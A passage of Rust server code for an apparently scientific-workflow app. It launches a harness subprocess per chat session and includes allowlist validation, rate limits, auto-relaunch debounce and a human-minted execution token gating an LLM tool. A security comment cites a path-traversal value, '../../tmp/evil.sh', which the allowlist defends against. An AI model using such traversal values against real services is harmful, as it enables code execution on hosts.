//! Execution start path. Houses the
//! `POST /api/chat/session/:id/start-execution` handler plus the
//! shared `spawn_harness_for_session` low-level helper consumed by
//! both the REST surface and the chat-driven `StartExecution` tool's
//! `ServiceEventSink`. Auto-relaunch logic (`maybe_auto_relaunch_harness`
//! + decision predicate + sentinel/heartbeat scans + ready-task scan)
//!   lives here because it ultimately funnels back into
//!   `spawn_harness_for_session`. The `resume_blocked_tasks_in_workflow`
//!   / `fail_blocked_tasks_in_workflow` helpers stay co-located with
//!   the spawn path so the unblock flow's "flip blocked → ready then
//!   relaunch" sequence is one read.

use super::super::*;
use axum::{extract::State, http::StatusCode, response::IntoResponse, Json};
use uuid::Uuid;

/// Default harness `--max-iterations` cap. Matches the value baked into:
/// - `crates/conversation/src/tools/execution.rs` (chat-driven execute-code)
/// - `e2e/playwright.config.ts` (live-tier specs)
/// - `Makefile` (`MAX_ITER` for `ivd-execute`)
///
/// Changes here must be propagated to all four sites.
pub(super) const DEFAULT_MAX_ITERATIONS: u32 = 20;

/// Security audit C-3 / 01 remediation.
///
/// `agent_path` is an implementation detail that flows from REST callers
/// (and from the LLM when the `StartExecution` tool was permitted to
/// supply it) into a `tokio::process::Command::new(harness_bin).arg("--agent").arg(path)`
/// chain. The harness then `exec`s the agent — so an attacker who can
/// reach the start-execution endpoint with an unconstrained `agent_path`
/// owns the host. The LLM tool schema has been pruned to drop
/// `agent_path` entirely (see `crates/conversation/src/tools/mod.rs`);
/// the REST surface still accepts it for the CLI/test path, but the
/// value is now validated against this allowlist before reaching
/// `Command::new`.
///
/// To add a new agent script, extend this slice AND drop the script
/// under `ECAA_SCRIPTS_DIR` (or `./scripts/` by default). Absolute paths
/// and arbitrary basenames are refused with `400`.
pub(crate) const ALLOWED_AGENT_SCRIPTS: &[&str] = &[
    "agent-claude.sh",
    "agent-claude-aws.sh",
    "agent-claude-slurm.sh",
    "agent-mock-blocker.sh",
    "agent-fixture-plots.sh",
];

/// Resolve a caller-supplied `agent_path` against the allowlist and
/// return a path rooted under `ECAA_SCRIPTS_DIR` (default `scripts/`).
/// The caller's path is reduced to its basename — any directory
/// component is stripped — so an attacker cannot escape the scripts dir
/// via `../../tmp/evil.sh` even if the basename happens to match an
/// allowed name. `None` yields `ECAA_DEFAULT_AGENT_PATH` when set,
/// otherwise the production default (`agent-claude.sh`).
pub(crate) fn validate_agent_path(req_path: Option<String>) -> Result<std::path::PathBuf, String> {
    validate_agent_path_with_default(req_path, std::env::var("ECAA_DEFAULT_AGENT_PATH").ok())
}

fn validate_agent_path_with_default(
    req_path: Option<String>,
    env_default: Option<String>,
) -> Result<std::path::PathBuf, String> {
    let repo_scripts = std::env::var("ECAA_SCRIPTS_DIR")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|_| std::path::PathBuf::from("scripts"));
    let requested = req_path.or(env_default);
    let basename = match requested {
        None => "agent-claude.sh".to_string(),
        Some(p) => std::path::Path::new(&p)
            .file_name()
            .and_then(|n| n.to_str())
            .map(str::to_string)
            .ok_or_else(|| format!("agent_path has no filename component: {p:?}"))?,
    };
    if !ALLOWED_AGENT_SCRIPTS.contains(&basename.as_str()) {
        return Err(format!(
            "agent {basename:?} not in allowlist {ALLOWED_AGENT_SCRIPTS:?}"
        ));
    }
    Ok(repo_scripts.join(basename))
}

/// Remove stale harness control sentinels from `<package_dir>/runtime`.
///
/// This must run before spawning a fresh harness. If cleanup is detached
/// after spawn, the new process can observe a leftover stop or pause
/// request from a prior run before the cleanup task wins the scheduler.
pub(crate) fn clean_stale_sentinels(package_dir: &std::path::Path) -> std::io::Result<()> {
    let runtime = package_dir.join("runtime");
    for sentinel in [".harness-pause", ".harness-stop", ".harness-paused"] {
        match std::fs::remove_file(runtime.join(sentinel)) {
            Ok(()) => {}
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => return Err(e),
        }
    }
    Ok(())
}

/// Flip every Blocked task in the emitted package's WORKFLOW.json back
/// to Ready so the harness picks them up on the next iteration. Called
/// from the /unblock handler. Best-effort: missing fields or a
/// malformed file are logged and swallowed so the session transition
/// still succeeds.
///
/// Uses `tokio::fs` so the request task doesn't block a tokio worker
/// on the (small but unbounded if the disk is degraded) WORKFLOW.json
/// read+write.
pub(crate) async fn resume_blocked_tasks_in_workflow(
    package_dir: &std::path::Path,
) -> anyhow::Result<()> {
    let path = package_dir.join("WORKFLOW.json");
    let raw = tokio::fs::read_to_string(&path).await?;
    let mut json: serde_json::Value = serde_json::from_str(&raw)?;
    let Some(tasks) = json.get_mut("tasks").and_then(|v| v.as_object_mut()) else {
        return Ok(());
    };
    let mut changed = false;
    for (_, task) in tasks.iter_mut() {
        let Some(state) = task.get("state") else {
            continue;
        };
        if state.get("status").and_then(|v| v.as_str()) == Some("blocked") {
            *task.get_mut("state").unwrap() = serde_json::json!({ "status": "ready" });
            changed = true;
        }
    }
    if changed {
        let pretty = serde_json::to_string_pretty(&json)?;
        tokio::fs::write(&path, pretty).await?;
    }
    Ok(())
}

/// mirror of `resume_blocked_tasks_in_workflow` that
/// marks blocked tasks as Failed instead of Ready. Used by the
/// `/unblock` "abort" resolution for stalled tasks.
///
/// Uses `tokio::fs` to avoid blocking a tokio worker on the
/// WORKFLOW.json read+write — same rationale as
/// `resume_blocked_tasks_in_workflow`.
pub(crate) async fn fail_blocked_tasks_in_workflow(
    package_dir: &std::path::Path,
) -> anyhow::Result<()> {
    let path = package_dir.join("WORKFLOW.json");
    let raw = tokio::fs::read_to_string(&path).await?;
    let mut json: serde_json::Value = serde_json::from_str(&raw)?;
    let Some(tasks) = json.get_mut("tasks").and_then(|v| v.as_object_mut()) else {
        return Ok(());
    };
    let mut changed = false;
    for (_, task) in tasks.iter_mut() {
        let Some(state) = task.get("state") else {
            continue;
        };
        if state.get("status").and_then(|v| v.as_str()) == Some("blocked") {
            *task.get_mut("state").unwrap() = serde_json::json!({
                "status": "failed",
                "reason": "aborted by SME from stall recovery",
            });
            changed = true;
        }
    }
    if changed {
        let pretty = serde_json::to_string_pretty(&json)?;
        tokio::fs::write(&path, pretty).await?;
    }
    Ok(())
}

/// `POST /api/chat/session/:id/start-execution` — launch the harness subprocess for an emitted package.
#[tracing::instrument(skip(app, headers, body, principal), fields(session_id = %session_id))]
pub async fn start_execution(
    State(app): State<ChatAppState>,
    Path(session_id): Path<Uuid>,
    headers: axum::http::HeaderMap,
    axum::extract::Extension(principal): axum::extract::Extension<crate::auth::RequestPrincipal>,
    body: Option<BoundedJson<StartExecutionRequest>>,
) -> axum::response::Response {
    // `Idempotency-Key` short-circuit. Prevents a
    // double-click or network retry from spawning two harness
    // subprocesses against the same session.
    let ticket = app
        .idempotency
        .lookup(session_id, "start_execution", &headers);
    if let Some(replay) = ticket.cached_response() {
        return replay;
    }
    // R4: attribute the Start press to the authenticated SME owner. The
    // press is a high-leverage state mutation gating the LLM's
    // `start_execution` tool; binding the token to the real principal
    // (never the request body) keeps the audit trail honest. Derived
    // from `RequestPrincipal::audit_actor()` — the same principal
    // `verify_owner_middleware` already extracted from `X-Scripps-User`.
    let granted_by = audit_actor_for_execution_token(&principal);
    let response = start_execution_inner(app.clone(), session_id, granted_by, body).await;
    ticket.store(&app.idempotency, response).await
}

/// Map the request's authenticated `RequestPrincipal` to the
/// conversation-crate `AuditActor` stamped onto the execution token.
///
/// There is no `From<server::AuditActor>` impl on the conversation type
/// (the two enums are kept aligned by hand — see
/// `crates/conversation/src/audit_actor.rs`), so the conversion is
/// spelled out here. `RequestPrincipal::audit_actor()` is the canonical
/// principal→actor map; we re-shape its server-side result into the
/// conversation-crate variant so the token-mint helper stays at the
/// bottom of the dep arrow.
fn audit_actor_for_execution_token(
    principal: &crate::auth::RequestPrincipal,
) -> ecaa_workflow_conversation::audit_actor::AuditActor {
    use ecaa_workflow_conversation::audit_actor::AuditActor as ConvActor;
    match principal.audit_actor() {
        crate::auth::AuditActor::User(user) => ConvActor::User(user),
        crate::auth::AuditActor::ShareViewer => ConvActor::ShareViewer,
        crate::auth::AuditActor::Harness => ConvActor::Harness,
        crate::auth::AuditActor::System => ConvActor::System,
    }
}

async fn start_execution_inner(
    app: ChatAppState,
    session_id: Uuid,
    granted_by: ecaa_workflow_conversation::audit_actor::AuditActor,
    body: Option<BoundedJson<StartExecutionRequest>>,
) -> axum::response::Response {
    // Imported (read-only) packages have no live execution surface — refuse
    // before burning a rate-limit token or minting an execution latch.
    if let Some(session) = app.conversation.get_session(session_id).await {
        if let Err(resp) = crate::chat_routes::package_import::ensure_not_imported(&session) {
            return resp;
        }
    }
    // Every
    // /start-execution spawns a harness subprocess (potentially an AWS
    // EC2 instance + agent tree). Cap at 12/min per session — easily
    // above SME-driven rerun cadence, well below "fork-bomb the host".
    if let Err(status) = LlmRateBuckets::check(
        &app.llm_buckets.start_exec,
        session_id,
        app.llm_rate_limits.start_exec,
    ) {
        return (
            status,
            "rate limit exceeded: /start-execution capped at 12/min/session",
        )
            .into_response();
    }

    let req = body.map(|BoundedJson(r)| r).unwrap_or_default();
    // C-3: refuse out-of-allowlist agent paths at the edge. The deeper
    // `spawn_harness_for_session_reserved` also validates, but failing
    // fast here keeps the error message in the user-facing 400 rather
    // than turning into a 500 once we're past the reservation guard.
    if let Err(reason) = validate_agent_path(req.agent_path.clone()) {
        return (
            StatusCode::BAD_REQUEST,
            format!("invalid agent_path: {reason}"),
        )
            .into_response();
    }
    // Mint the single-use execution latch: this REST route IS the human
    // Start button. Mirrors `/confirm` minting the ConfirmationToken.
    // The LLM `start_execution` tool refuses unless this token is present
    // and unconsumed, so an autonomous agent can only ride a press the
    // SME already made. `granted_by` is the authenticated owner derived
    // from the request's `RequestPrincipal` (R4) — `AuditActor::System`
    // only when the principal could not be identified (e.g. Anonymous /
    // CLI offline paths). The button path below still spawns directly, so
    // a missing/failed mint never blocks the human press — it only
    // affects the LLM tool's ability to ride it.
    if let Err(e) = app
        .conversation
        .store_handle()
        .update(session_id, move |s| {
            s.mint_execution_token(chrono::Utc::now(), granted_by);
            Ok(())
        })
        .await
    {
        tracing::warn!(session_id = %session_id, error = %e, "minting execution token failed");
    }
    // Fresh `/execution/start`: a first run honours the configured
    // method-source authority — no freeze (plan Task 5.2).
    match spawn_harness_for_session(&app, session_id, req.agent_path, req.max_iterations, false)
        .await
    {
        Ok(handle) => Json(ExecutionStatusResponse {
            pid: handle.pid,
            pgid: handle.pgid,
            started_at: handle.started_at,
            package_dir: handle.package_dir,
            agent_command: handle.agent_command,
            status: "running".into(),
            exit_code: None,
            paused_at: None,
            stop_requested_at: None,
        })
        .into_response(),
        Err(SpawnHarnessError::SessionNotFound) => {
            (StatusCode::NOT_FOUND, "session not found").into_response()
        }
        Err(SpawnHarnessError::NotEmitted) => (
            StatusCode::BAD_REQUEST,
            "session has no emitted package — cannot start execution",
        )
            .into_response(),
        Err(SpawnHarnessError::AlreadyRunning { pid }) => (
            StatusCode::CONFLICT,
            format!("execution already running (pid {})", pid),
        )
            .into_response(),
        Err(SpawnHarnessError::AlreadyStarting) => (
            StatusCode::CONFLICT,
            "execution is already starting".to_string(),
        )
            .into_response(),
        Err(SpawnHarnessError::ReplayInProgress) => (
            StatusCode::CONFLICT,
            "cannot start execution while a replay is running".to_string(),
        )
            .into_response(),
        Err(SpawnHarnessError::SpawnFailed(e)) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("failed to spawn harness: {}", e),
        )
            .into_response(),
        Err(SpawnHarnessError::SentinelCleanup(e)) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("failed to clean stale harness sentinels: {}", e),
        )
            .into_response(),
        Err(SpawnHarnessError::NoPid) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            "spawned harness has no pid",
        )
            .into_response(),
    }
}

pub(crate) enum SpawnHarnessError {
    SessionNotFound,
    NotEmitted,
    AlreadyRunning { pid: u32 },
    AlreadyStarting,
    /// A backgrounded reproducibility replay is in flight for this
    /// session; starting the harness would race the replay's recorded
    /// compute re-execution. Mapped to 409 at the REST call site.
    ReplayInProgress,
    SpawnFailed(std::io::Error),
    SentinelCleanup(std::io::Error),
    NoPid,
}

/// Minimum gap between the previous harness spawn's `started_at` and a
/// new auto-relaunch. Prevents a tight loop where the agent instantly
/// re-blocks and the user unblocks again: a single unblock spawns one
/// harness, re-blocks count as the existing handle (exit_status set),
/// and we skip further auto-spawns until the window expires. The
/// explicit `POST /start-execution` path is NOT debounced — operator
/// can always manually force a relaunch.
pub(super) const AUTO_RELAUNCH_DEBOUNCE_SECS: i64 = 10;

/// Extended debounce applied when the package's blocker.json scan
/// indicates a task is/was waiting on an in-flight compute sentinel
/// AND its heartbeat is still fresh. Keeps the SME's "Retry" click
/// from pumping Opus dispatches every 10 s while the long-running
/// detached compute (R, Python, remote API poll) hasn't yet emitted
/// its `integration_status.OK / FAILED` sentinel. Combined with the
/// harness's deterministic finalize probe, this means the harness
/// still relaunches periodically (so the probe runs) but at a cadence
/// matched to the heartbeat threshold rather than to user clicks.
pub(super) const AUTO_RELAUNCH_SENTINEL_DEBOUNCE_SECS: i64 = 450;

/// Threshold for treating a task's heartbeat as "fresh" in the
/// sentinel-pending scan. Mirrors the harness's
/// `ECAA_TASK_HEARTBEAT_STALL_SECS` so producer + consumer agree on
/// what "alive" means. Default 900s = 15 min.
fn server_heartbeat_freshness_secs() -> u64 {
    std::env::var("ECAA_TASK_HEARTBEAT_STALL_SECS")
        .ok()
        .and_then(|s| s.parse::<u64>().ok())
        .unwrap_or(900)
}

/// Decision predicate for auto-relaunch: pure function over the
/// inputs so the unblock / sme-selection handlers can test the guard
/// without spawning real harness processes. Returns None to skip (with
/// a human-readable reason for logging) or Some to proceed.
///
/// Guards, in order:
/// 1. Session must have an emitted package (can't run without one).
/// 2. Session state must not be Blocked — if the unblock path hit
///    an error and state is still Blocked, there's nothing to run.
/// 3. No active execution handle, OR the handle exited at least
///    `AUTO_RELAUNCH_DEBOUNCE_SECS` ago — extended to
///    `AUTO_RELAUNCH_SENTINEL_DEBOUNCE_SECS` when
///    `sentinel_pending_with_fresh_heartbeat` is true (compute is
///    still in flight; no point spinning up Opus to ask "is it done
///    yet").
/// 4. At least one task in WORKFLOW.json must be in `ready` state.
///    The unblock path flipped blocked→ready just before this check,
///    so this guards the "unblock fired but no task was blocked"
///    edge case.
pub(super) fn auto_relaunch_decision(
    package_dir: Option<&std::path::Path>,
    session_is_blocked: bool,
    existing_handle_started_at: Option<chrono::DateTime<chrono::Utc>>,
    existing_handle_exited: Option<bool>,
    has_ready_task_in_workflow: bool,
    sentinel_pending_with_fresh_heartbeat: bool,
    now: chrono::DateTime<chrono::Utc>,
) -> Result<(), &'static str> {
    if package_dir.is_none() {
        return Err("no emitted package");
    }
    if session_is_blocked {
        return Err("session still blocked");
    }
    if let Some(exited) = existing_handle_exited {
        if !exited {
            return Err("execution already running");
        }
        if let Some(started) = existing_handle_started_at {
            let age = (now - started).num_seconds();
            let debounce = if sentinel_pending_with_fresh_heartbeat {
                AUTO_RELAUNCH_SENTINEL_DEBOUNCE_SECS
            } else {
                AUTO_RELAUNCH_DEBOUNCE_SECS
            };
            if age < debounce {
                return Err(if sentinel_pending_with_fresh_heartbeat {
                    "debounced (sentinel-pending, fresh heartbeat — compute still in flight)"
                } else {
                    "debounced (last spawn too recent)"
                });
            }
        }
    }
    if !has_ready_task_in_workflow {
        return Err("no ready tasks");
    }
    Ok(())
}

/// Whether an auto-relaunch with the given `trigger` is a deliberate
/// rerun/amend of an already-emitted package, and therefore must freeze
/// the harness's method-source authority (plan Task 5.2).
///
/// `rerun_task`, `amend_method`, and `undo_amend` re-execute a previously
/// emitted package against a (re-)materialised plan; preserving the
/// original method-landscape provenance means no fresh live discovery may
/// run, so the harness is launched with `--frozen-method-source`.
///
/// `unblock` / `apply_remediation` are continuations of the *same* in-flight
/// run (recovery, not a rerun) and the fresh-start path
/// (`POST /execution/start`, `start_execution`) never routes through the
/// auto-relaunch hook at all — neither freezes, so a first run honours the
/// configured `ECAA_METHOD_SOURCE_AUTHORITY`.
fn trigger_freezes_method_source(trigger: &str) -> bool {
    matches!(trigger, "rerun_task" | "amend_method" | "undo_amend")
}

/// Build the ordered argv (excluding the binary itself) for a harness
/// spawn. Extracted as a pure function so the conditional
/// `--frozen-method-source` flag (plan Task 5.2) is unit-testable without
/// spawning a process. `frozen_method_source` is appended last when set so
/// the base args are stable across fresh and frozen relaunches.
fn harness_command_args(
    package_dir: &std::path::Path,
    agent_path: &str,
    max_iter: u32,
    session_id: SessionId,
    server_url: &str,
    frozen_method_source: bool,
) -> Vec<String> {
    let mut args = vec![
        "--package".to_string(),
        package_dir.to_string_lossy().into_owned(),
        "--agent".to_string(),
        agent_path.to_string(),
        "--max-iterations".to_string(),
        max_iter.to_string(),
        "--session-id".to_string(),
        session_id.to_string(),
        "--server-url".to_string(),
        server_url.to_string(),
        "--no-interactive".to_string(),
    ];
    if frozen_method_source {
        args.push("--frozen-method-source".to_string());
    }
    args
}

/// Scan the package's `runtime/outputs/<task>/blocker.json` files for
/// any task whose `block_reason` indicates an in-flight compute
/// sentinel is pending AND whose `.heartbeat` is younger than the
/// freshness threshold. Returns true on the first match — there's no
/// reason to enumerate all of them, the auto-relaunch decision is
/// binary.
///
/// Best-effort: missing dirs / unparseable files are treated as "not
/// matching" and the function returns false. The decision is
/// fail-open — when in doubt, allow the relaunch (existing behavior).
pub(super) fn has_sentinel_pending_with_fresh_heartbeat(package_dir: &std::path::Path) -> bool {
    let outputs_root = package_dir.join("runtime/outputs");
    let Ok(entries) = std::fs::read_dir(&outputs_root) else {
        return false;
    };
    let threshold_secs = server_heartbeat_freshness_secs();
    for entry in entries.flatten() {
        let Ok(name) = entry.file_name().into_string() else {
            continue;
        };
        if !entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
            continue;
        }
        let task_dir = outputs_root.join(&name);
        if task_matches_sentinel_pending_with_fresh_heartbeat(&task_dir, threshold_secs) {
            return true;
        }
    }
    false
}

/// Per-task helper for [`has_sentinel_pending_with_fresh_heartbeat`].
/// Extracted so the unit tests can exercise the matching rules
/// directly without setting up a full package tree.
fn task_matches_sentinel_pending_with_fresh_heartbeat(
    task_dir: &std::path::Path,
    threshold_secs: u64,
) -> bool {
    let blocker_path = task_dir.join("blocker.json");
    let Ok(raw) = std::fs::read_to_string(&blocker_path) else {
        return false;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&raw) else {
        return false;
    };
    // Two recognised hint shapes — the agent vocabulary has settled on
    // both forms in the wild:
    // 1. `block_reason: "in_flight_sentinel_pending"` (typed field)
    // 2. `summary` or `reason` text containing the same marker
    let block_reason_match = json
        .get("block_reason")
        .and_then(|v| v.as_str())
        .map(|s| s == "in_flight_sentinel_pending")
        .unwrap_or(false);
    let text_match = json
        .get("summary")
        .or_else(|| json.get("reason"))
        .and_then(|v| v.as_str())
        .map(|s| s.contains("in_flight_sentinel_pending") || s.contains("sentinel pending"))
        .unwrap_or(false);
    if !(block_reason_match || text_match) {
        return false;
    }
    // Heartbeat must be fresh — a stale heartbeat means the compute
    // has actually died and the relaunch should proceed normally so
    // the harness's heartbeat-stall detector can surface the real
    // failure to the SME.
    let heartbeat = task_dir.join(".heartbeat");
    let Ok(meta) = std::fs::metadata(&heartbeat) else {
        return false;
    };
    let Ok(modified) = meta.modified() else {
        return false;
    };
    let Ok(elapsed) = modified.elapsed() else {
        return false;
    };
    elapsed.as_secs() < threshold_secs
}

/// Check WORKFLOW.json for any task in `ready` state. Best-effort: IO
/// or parse failures return false, which surfaces in
/// `auto_relaunch_decision` as the "no ready tasks" skip reason. Not
/// a cryptographic scan — a subsequent harness iteration will re-read
/// the file anyway.
pub(super) fn has_ready_task(package_dir: &std::path::Path) -> bool {
    let path = package_dir.join("WORKFLOW.json");
    let Ok(raw) = std::fs::read_to_string(&path) else {
        return false;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&raw) else {
        return false;
    };
    let Some(tasks) = json.get("tasks").and_then(|v| v.as_object()) else {
        return false;
    };
    tasks.values().any(|t| {
        t.get("state")
            .and_then(|s| s.get("status"))
            .and_then(|s| s.as_str())
            == Some("ready")
    })
}

/// Check + spawn path for the auto-relaunch hook. Invoked from
/// `/unblock` and `/task/:task_id/sme-selection` handlers after they
/// finish their state work. Non-blocking: any skip reason is logged
/// via `tracing` at info / warn (F14 migration from the previous
/// `[auto_relaunch]` eprintln prefix), not returned to the HTTP
/// caller, so the interactive flow (e.g., BlockerCard Unblock
/// button) always sees a fast NO_CONTENT regardless of whether the
/// harness actually (re)started.
pub(crate) async fn maybe_auto_relaunch_harness(
    app: &ChatAppState,
    session_id: SessionId,
    trigger: &'static str,
) {
    let Some(session) = app.conversation.get_session(session_id).await else {
        tracing::info!(
            session_id = %session_id,
            trigger = %trigger,
            reason = "session not found",
            "auto-relaunch skipped"
        );
        return;
    };
    let package_dir = session.emitted_package_path.clone();

    if !auto_relaunch_should_proceed(app, session_id, trigger, &session, package_dir).await {
        return;
    }

    // optional hard stop. Refuse to (re)spawn
    // when the projected-finish cost would exceed the session's
    // budget cap *and* the operator opted in to hard-stop semantics
    // via `ECAA_BUDGET_HARD_STOP=1`. Default is soft (warn-only +
    // confirm modal at UI layer).
    if budget_hard_stop_blocks(app, &session, session_id, trigger).await {
        return;
    }

    // Freeze method-source discovery when this relaunch is a deliberate
    // rerun/amend of an already-emitted package, so the harness preserves
    // the original method-landscape provenance instead of running fresh
    // live discovery (plan Task 5.2).
    let frozen_method_source = trigger_freezes_method_source(trigger);
    let outcome =
        spawn_harness_for_session(app, session_id, None, None, frozen_method_source).await;
    log_auto_relaunch_outcome(session_id, trigger, outcome);
}

/// Evaluate the debounce decision and the per-session relaunch rate cap,
/// logging the skip reason. Returns true only when both gates pass.
async fn auto_relaunch_should_proceed(
    app: &ChatAppState,
    session_id: SessionId,
    trigger: &'static str,
    session: &ecaa_workflow_conversation::session::Session,
    package_dir: Option<std::path::PathBuf>,
) -> bool {
    if !auto_relaunch_debounce_passes(app, session_id, trigger, session, package_dir).await {
        return false;
    }
    relaunch_rate_cap_passes(app, session_id, trigger)
}

/// Run the deterministic debounce decision (state, prior-run timing, ready
/// tasks, sentinel) and log the skip reason on failure.
async fn auto_relaunch_debounce_passes(
    app: &ChatAppState,
    session_id: SessionId,
    trigger: &'static str,
    session: &ecaa_workflow_conversation::session::Session,
    package_dir: Option<std::path::PathBuf>,
) -> bool {
    let session_is_blocked = matches!(
        session.state,
        ecaa_workflow_conversation::SessionState::Blocked { .. }
    );

    let (existing_started, existing_exited) =
        resolve_existing_execution_timing(app, session_id, package_dir.as_ref());

    let (has_ready, sentinel_pending) = check_ready_and_sentinel(package_dir.clone()).await;

    if let Err(reason) = auto_relaunch_decision(
        package_dir.as_deref(),
        session_is_blocked,
        existing_started,
        existing_exited,
        has_ready,
        sentinel_pending,
        chrono::Utc::now(),
    ) {
        // F14: migrated from `eprintln!("[auto_relaunch]...")` to
        // structured `tracing::info!`. Structured fields preserved so
        // the previous `key=val` text grep stays usable under
        // `RUST_LOG=info` / JSON formatter alike.
        tracing::info!(
            session_id = %session_id,
            trigger = %trigger,
            reason = %reason,
            "auto-relaunch skipped"
        );
        return false;
    }
    true
}

/// Enforce the per-session auto-relaunch rate cap (4/min), logging on hit.
/// Manual `/start-execution` is NOT gated here.
fn relaunch_rate_cap_passes(
    app: &ChatAppState,
    session_id: SessionId,
    trigger: &'static str,
) -> bool {
    // Security remediation
    // cap auto-relaunch dispatches to 4/min/session so a tight
    // unblock→re-block loop cannot pump an unbounded harness chain.
    if !app.relaunch_tracker.allow(session_id, 4) {
        tracing::warn!(
            session_id = %session_id,
            trigger = %trigger,
            cap_per_min = 4,
            "auto-relaunch rate-limited"
        );
        return false;
    }
    true
}

/// Off-thread probe of the package's ready-task + sentinel-pending state. Both
/// helpers do synchronous JSON reads + `runtime/outputs/` walks, so they run on
/// the blocking pool to keep tokio workers free on slow disks.
async fn check_ready_and_sentinel(package_dir: Option<std::path::PathBuf>) -> (bool, bool) {
    let pkg_for_ready = package_dir.clone();
    let pkg_for_sentinel = package_dir;
    let has_ready = tokio::task::spawn_blocking(move || {
        pkg_for_ready
            .as_deref()
            .map(has_ready_task)
            .unwrap_or(false)
    })
    .await
    .unwrap_or(false);
    let sentinel_pending = tokio::task::spawn_blocking(move || {
        pkg_for_sentinel
            .as_deref()
            .map(has_sentinel_pending_with_fresh_heartbeat)
            .unwrap_or(false)
    })
    .await
    .unwrap_or(false);
    (has_ready, sentinel_pending)
}

/// OS-level liveness probe of the per-session harness lockfile
/// (`$HOME/.ecaa-workflow/locks/<session_id>.lock`, written by the harness
/// `SessionLock` as "<pid> <ts>"). A `--no-interactive` harness blocked on
/// `waiting_for_sme` loops indefinitely holding the flock but never writes an
/// exit sidecar, so both the in-memory handle AND the sidecar miss it — this
/// probe is the authoritative backstop that closes the auto-relaunch fail-open
/// (worst after a server restart drops the in-memory executions map). Pure-std
/// `/proc/<pid>` check (this crate denies `unsafe`, so no `kill(pid, 0)`).
fn harness_lock_pid_alive(session_id: SessionId) -> bool {
    let Some(home) = std::env::var_os("HOME") else {
        return false;
    };
    let lock = std::path::PathBuf::from(home)
        .join(".ecaa-workflow")
        .join("locks")
        .join(format!("{session_id}.lock"));
    let Ok(contents) = std::fs::read_to_string(&lock) else {
        return false;
    };
    let Some(pid_str) = contents.split_whitespace().next() else {
        return false;
    };
    let Ok(pid) = pid_str.parse::<u32>() else {
        return false;
    };
    std::path::Path::new(&format!("/proc/{pid}")).exists()
}

/// Resolve the prior execution's (started_at, exited) timing from the in-memory
/// handle, falling back to the on-disk sidecar (watcher-cancel + post-restart
/// paths) so the debounce window is honored even when the map is empty.
fn resolve_existing_execution_timing(
    app: &ChatAppState,
    session_id: SessionId,
    package_dir: Option<&std::path::PathBuf>,
) -> (Option<chrono::DateTime<chrono::Utc>>, Option<bool>) {
    match app.executions.get(&session_id) {
        Some(h_ref) => {
            let h = h_ref.value();
            let mut exited = h.exit_status_get().is_some();
            let mut started = h.started_at;
            // R3.4 fallback: if the watcher task was cancelled
            // (graceful shutdown between `child.wait().await`
            // returning and the in-memory `Release` store), the
            // in-memory handle still reads `exit_status=UNSET`. The
            // sidecar — written before the atomic store — recovers
            // the truth.
            if !exited {
                if let Some(pkg) = package_dir {
                    if let Ok(Some(persisted)) = execution_status_sidecar::read(pkg) {
                        if persisted.pid == h.pid {
                            exited = true;
                            started = persisted.started_at;
                        }
                    }
                }
            }
            (Some(started), Some(exited))
        }
        // Post-restart path: the in-memory map is empty (process
        // restart drops it). Fall back to the sidecar so an unblock
        // after restart still respects the debounce window against
        // the prior run's started_at.
        None => match package_dir.and_then(|p| execution_status_sidecar::read(p).ok().flatten()) {
            Some(persisted) => (Some(persisted.started_at), Some(true)),
            None => {
                // OS-level backstop (P1): a still-looping --no-interactive
                // harness blocked on waiting_for_sme holds the session flock but
                // writes no exit sidecar, so neither the in-memory handle nor
                // the sidecar sees it. Probe the lockfile pid; if alive, report
                // the prior run as NOT exited so auto_relaunch_decision yields
                // "execution already running" and suppresses a flock-doomed
                // re-spawn.
                if harness_lock_pid_alive(session_id) {
                    (None, Some(false))
                } else {
                    (None, None)
                }
            }
        },
    }
}

/// Returns true (and logs the skip) when `ECAA_BUDGET_HARD_STOP=1` and the
/// projected finish cost exceeds the session's budget cap.
async fn budget_hard_stop_blocks(
    app: &ChatAppState,
    session: &ecaa_workflow_conversation::session::Session,
    session_id: SessionId,
    trigger: &'static str,
) -> bool {
    if !ecaa_workflow_core::env_helpers::env_bool("ECAA_BUDGET_HARD_STOP") {
        return false;
    }
    let Some(cap) = session.budget_usd else {
        return false;
    };
    let Some(metrics) = app.conversation.metrics_snapshot(session_id).await else {
        return false;
    };
    if metrics.projected_finish_usd > cap {
        tracing::warn!(
            session_id = %session_id,
            trigger = %trigger,
            projected_finish_usd = metrics.projected_finish_usd,
            budget_usd = cap,
            "auto-relaunch skipped: ECAA_BUDGET_HARD_STOP=1 and projected finish exceeds budget"
        );
        return true;
    }
    false
}

/// Translate the spawn result of an auto-relaunch into the appropriate tracing
/// line (info on success / spawn-race, warn on genuine spawn errors).
fn log_auto_relaunch_outcome(
    session_id: SessionId,
    trigger: &'static str,
    outcome: Result<ExecutionHandle, SpawnHarnessError>,
) {
    let err = match outcome {
        Ok(h) => {
            tracing::info!(
                session_id = %session_id,
                trigger = %trigger,
                pid = h.pid,
                "auto-relaunch spawned harness"
            );
            return;
        }
        Err(e) => e,
    };
    // Spawn races (AlreadyRunning/AlreadyStarting) are benign — the inner
    // guard already prevented a second spawn — and log at info. Everything
    // else is a genuine spawn error logged at warn.
    if let Some(winning_pid) = spawn_race_winning_pid(&err) {
        log_spawn_race(session_id, trigger, winning_pid);
    } else {
        let msg = spawn_error_message(err);
        tracing::warn!(
            session_id = %session_id,
            trigger = %trigger,
            error = %msg,
            "auto-relaunch spawn error"
        );
    }
}

/// `Some(Some(pid))` for AlreadyRunning, `Some(None)` for AlreadyStarting,
/// `None` for any genuine error. The outer Option distinguishes race from error.
fn spawn_race_winning_pid(err: &SpawnHarnessError) -> Option<Option<u32>> {
    match err {
        SpawnHarnessError::AlreadyRunning { pid } => Some(Some(*pid)),
        SpawnHarnessError::AlreadyStarting => Some(None),
        // A running replay is a legitimate reason to skip auto-relaunch,
        // not a genuine spawn error — treat it as a benign lost race.
        SpawnHarnessError::ReplayInProgress => Some(None),
        _ => None,
    }
}

/// Log a benign auto-relaunch spawn race at info level.
fn log_spawn_race(session_id: SessionId, trigger: &'static str, winning_pid: Option<u32>) {
    match winning_pid {
        Some(pid) => tracing::info!(
            session_id = %session_id,
            trigger = %trigger,
            winning_pid = pid,
